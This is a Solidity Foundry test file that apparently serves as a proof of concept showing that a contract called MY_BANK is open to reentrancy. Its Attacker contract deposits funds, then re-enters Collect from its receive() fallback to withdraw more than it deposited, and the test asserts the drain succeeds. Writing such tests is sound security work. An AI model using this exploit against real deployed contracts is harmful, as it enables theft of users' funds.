
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is at least MinSum (1 ether) and not too large to avoid overflow
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to have deposited funds first via Put()
        // unlockTime should be in the past so Collect can be called

        // --- 3. Funding ---
        // Fund the Victim contract (so it has ETH to steal beyond attacker's deposit)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds into MY_BANK
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time forward to ensure unlockTime has passed
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = MY_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into MY_BANK with unlockTime = 0 (immediately unlocked)
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        
        // 3. Call the vulnerable function
        attackCallCount = 1;
        victim.Collect(val);
        
        // 4. Verify Success Conditions
        // If we called Collect more than once (reentrancy occurred) and received more than we should have
        if (attackCallCount >= 2 && address(this).balance >= storedAttackVal * 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2 && address(victim).balance >= storedAttackVal) {
            // Re-enter the contract
            attackCallCount++;
            victim.Collect(storedAttackVal);
        }
    }
}
